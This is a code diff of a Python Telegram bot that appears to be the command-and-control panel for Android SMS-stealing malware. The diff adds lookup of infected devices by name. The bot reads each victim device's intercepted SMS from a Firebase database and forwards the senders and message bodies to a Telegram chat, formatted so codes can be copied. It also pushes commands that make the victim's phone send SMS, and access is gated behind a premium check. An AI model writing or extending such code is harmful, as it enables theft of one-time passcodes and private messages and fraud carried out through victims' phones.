@@ -35,7 +35,7 @@ async def check(update: Update):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Premium check
     if not await check(update):
-        return  # Yahan check() function automatically premium na hone par error bhej dega
+        return
 
     # Agar user premium hai, toh ye menu dikhega
     start_text = (
@@ -120,7 +120,28 @@ async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
-    await show_device_page(update, context, 0)
+    global firebase_base, selected_device_id
+    
+    if context.args:
+        search_query = context.args[0]
+        try:
+            response = requests.get(f"{firebase_base}/user_data.json")
+            clients = response.json() or {}
+            found_id = None
+            for client_id, info in clients.items():
+                d_name = str(info.get('d_name', '')).lower()
+                if client_id == search_query or d_name == search_query.lower():
+                    found_id = client_id
+                    break
+            if found_id:
+                selected_device_id = found_id
+                await update.message.reply_text(f"✅ Device '{search_query}' automatically select ho gayi!\n🆔 ID: {found_id}")
+            else:
+                await update.message.reply_text(f"❌ Device '{search_query}' nahi mili.")
+        except Exception as e:
+            await update.message.reply_text(f"Error: {str(e)}")
+    else:
+        await show_device_page(update, context, 0)
 
 async def show_device_page(update, context, page):
     global firebase_base
@@ -222,53 +243,38 @@ async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def monitor_task(chat_id, context):
     global is_monitoring, selected_device_id
     last_sms_id = None
-
-    # Initial last_sms_id set kar rahe hain
     try:
         data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
         if data and isinstance(data, dict):
             last_sms_id = list(data.keys())[-1]
     except:
         pass
-
     while is_monitoring:
         try:
-            # Firebase se specific device ka data fetch karo
             data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
-            
             if data and isinstance(data, dict):
                 current_keys = list(data.keys())
                 latest_key = current_keys[-1]
-
-                # Sirf tabhi message bhejo agar nayi key mili hai
                 if latest_key != last_sms_id:
                     last_sms_id = latest_key
                     sms = data[latest_key]
-                    
-                    # Firebase structure ke hisaab se sahi keys le rahe hain
                     sender = sms.get('sender', 'Unknown')
-                    time_val = sms.get('date', 'Unknown') # JSON mein 'date' field hai
-                    msg_content = sms.get('body', 'No Content') # JSON mein 'body' field hai
-
-                    # Telegram mein code block (`...`) par click karte hi text copy ho jata hai
+                    time_val = sms.get('date', 'Unknown')
+                    msg_content = sms.get('body', 'No Content')
                     text = (f"📩 New Incoming SMS\n\n"
                             f"📱 From: {sender}\n"
                             f"🕒 Time: {time_val}\n\n"
                             f"💬 Message: `{msg_content}`")
-                    
-                    # Markdown ka use kiya hai taaki code block kaam kare
                     await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")
-
         except Exception as e:
             print(f"Error in monitor: {e}")
-            
         await asyncio.sleep(5)
         
 async def start_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
     global is_monitoring
     if not selected_device_id or not monitored_channel_id:
-        await update.message.reply_text("❌ Error: Channel set karna zaroori hai!")
+        await update.message.reply_text("❌ Error: Device aur Channel set karna zaroori hai!")
         return
     is_monitoring = True
     asyncio.create_task(monitor_task(update.effective_chat.id, context))
@@ -284,9 +290,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if "To:" in msg_text and "Message:" in msg_text:
                 target_number = msg_text.split("To:")[1].split("\n")[0].strip()
                 token = msg_text.split("Message:")[1].split("\n")[0].strip()
-            
             if target_number and token:
-                # App logic ke mutabik keys update ki gayi hain
                 payload = {
                     "targetDeviceId": selected_device_id,
                     "phoneNumber": target_number,
@@ -294,13 +298,8 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     "simSlot": "0",
                     "command": "send message"
                 }
-                
-                # Path ko tumhare Smali code ke reference ke mutabik set kiya hai
                 push_url = f"{firebase_base}/user_data/{selected_device_id}.json"
-                
-                # 'patch' ka use kiya hai taaki sirf fields update hon
                 response = requests.patch(push_url, json=payload)
-                
                 if response.status_code == 200:
                     await update.effective_chat.send_message(f"✅ SMS Command Pushed to Firebase!\n🎯 To: {target_number}")
                 else:
